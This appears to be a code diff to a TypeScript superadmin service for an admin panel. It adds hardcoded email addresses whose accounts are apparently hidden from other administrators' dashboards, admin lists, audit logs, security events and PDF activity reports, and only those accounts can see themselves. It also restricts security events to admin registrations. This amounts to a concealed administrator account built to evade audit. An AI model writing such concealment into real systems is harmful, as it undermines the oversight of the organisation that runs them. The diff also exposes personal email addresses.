@@ -22,6 +22,10 @@ function toNum(value: string | null | undefined): number {
 }
 
 export class SuperadminService {
+  private static readonly HIDDEN_ADMIN_EMAILS = new Set([
+    "kamolovmuhsin@icloud.com",
+    "kamolovmuhsin@iclod.com",
+  ]);
   private readonly repository: SuperadminRepository;
   private readonly pdfService: ActivityReportPdfService;
 
@@ -34,7 +38,7 @@ export class SuperadminService {
     this.pdfService = new ActivityReportPdfService();
   }
 
-  async getDashboard(): Promise<{
+  async getDashboard(viewerUserId?: string): Promise<{
     pendingQueue: number;
     processed7d: number;
     avgReviewMinutes: number;
@@ -43,7 +47,8 @@ export class SuperadminService {
     overloadedQueue: boolean;
     alerts: Array<{ code: string; message: string; severity: "warning" | "critical" }>;
   }> {
-    const row = await this.repository.getSuperDashboardSummary();
+    const includeHidden = await this.canViewHiddenAdmin(viewerUserId);
+    const row = await this.repository.getSuperDashboardSummary(includeHidden);
     const pendingQueue = toNum(row.pending_queue);
     const securityAlertsCount = toNum(row.security_alerts_count);
     const activeAdminsToday = toNum(row.active_admins_today);
@@ -82,8 +87,12 @@ export class SuperadminService {
     };
   }
 
-  async listAdmins(query: SuperadminListQuery) {
-    const [total, rows] = await Promise.all([this.repository.countAdmins(query), this.repository.listAdmins(query)]);
+  async listAdmins(query: SuperadminListQuery, viewerUserId?: string) {
+    const includeHidden = await this.canViewHiddenAdmin(viewerUserId);
+    const [total, rows] = await Promise.all([
+      this.repository.countAdmins(query, includeHidden),
+      this.repository.listAdmins(query, includeHidden),
+    ]);
     const totalPages = Math.max(1, Math.ceil(total / query.pageSize));
     return {
       items: rows.map((r) => ({
@@ -110,9 +119,10 @@ export class SuperadminService {
     };
   }
 
-  async getAdminDetail(adminId: string, query: SuperadminListQuery) {
+  async getAdminDetail(adminId: string, query: SuperadminListQuery, viewerUserId?: string) {
+    const includeHidden = await this.canViewHiddenAdmin(viewerUserId);
     const [identity, stats, totalActivity, activity, sessions] = await Promise.all([
-      this.repository.findAdminIdentity(adminId),
+      this.repository.findAdminIdentity(adminId, includeHidden),
       this.repository.getAdminStats(adminId),
       this.repository.countAdminRecentActivity(adminId),
       this.repository.listAdminRecentActivity(adminId, query.page, query.pageSize),
@@ -258,8 +268,12 @@ export class SuperadminService {
     return { temporaryPassword, email };
   }
 
-  async listAuditLogs(query: SuperadminAuditQuery) {
-    const [total, rows] = await Promise.all([this.repository.countAuditLogs(query), this.repository.listAuditLogs(query)]);
+  async listAuditLogs(query: SuperadminAuditQuery, viewerUserId?: string) {
+    const includeHidden = await this.canViewHiddenAdmin(viewerUserId);
+    const [total, rows] = await Promise.all([
+      this.repository.countAuditLogs(query, includeHidden),
+      this.repository.listAuditLogs(query, includeHidden),
+    ]);
     const totalPages = Math.max(1, Math.ceil(total / query.pageSize));
     return {
       items: rows.map((r) => ({
@@ -271,7 +285,10 @@ export class SuperadminService {
         action: r.action,
         targetTable: r.target_table,
         targetId: r.target_id,
+        targetTitle: r.submission_title,
         details: r.metadata,
+        oldValues: r.old_values,
+        newValues: r.new_values,
         ip: r.request_ip,
       })),
       pagination: {
@@ -285,10 +302,15 @@ export class SuperadminService {
     };
   }
 
-  async listSecurityEvents(query: SuperadminSecurityQuery) {
+  async listSecurityEvents(query: SuperadminSecurityQuery, viewerUserId?: string) {
+    const includeHidden = await this.canViewHiddenAdmin(viewerUserId);
+    const registrationOnlyQuery: SuperadminSecurityQuery = {
+      ...query,
+      type: "admin_registration",
+    };
     const [total, rows] = await Promise.all([
-      this.repository.countSecurityEvents(query),
-      this.repository.listSecurityEvents(query),
+      this.repository.countSecurityEvents(registrationOnlyQuery, includeHidden),
+      this.repository.listSecurityEvents(registrationOnlyQuery, includeHidden),
     ]);
     const totalPages = Math.max(1, Math.ceil(total / query.pageSize));
     return {
@@ -385,6 +407,7 @@ export class SuperadminService {
     query: SuperadminActivityPdfQuery,
     actorUserId: string,
   ): Promise<{ buffer: Buffer; filename: string }> {
+    const includeHidden = await this.canViewHiddenAdmin(actorUserId);
     const now = new Date();
     const range = this.resolveRange(query, now);
     const rows = await this.repository.listActivityReportRows({
@@ -392,6 +415,7 @@ export class SuperadminService {
       to: range.to,
       adminId: query.adminId,
       actionType: query.actionType,
+      includeHidden,
     });
     const actor = await this.repository.findAdminIdentity(actorUserId);
     const generatedBy =
@@ -417,6 +441,15 @@ export class SuperadminService {
 
   async updateLastLogin(adminId: string, ip: string | null): Promise<void> {
     await this.repository.updateAdminLastLogin(adminId, ip);
+  }
+
+  private async canViewHiddenAdmin(viewerUserId?: string): Promise<boolean> {
+    if (!viewerUserId) {
+      return false;
+    }
+    const email = await this.repository.findAdminEmail(viewerUserId);
+    const normalized = email?.trim().toLowerCase() ?? "";
+    return SuperadminService.HIDDEN_ADMIN_EMAILS.has(normalized);
   }
 
   private resolveRange(
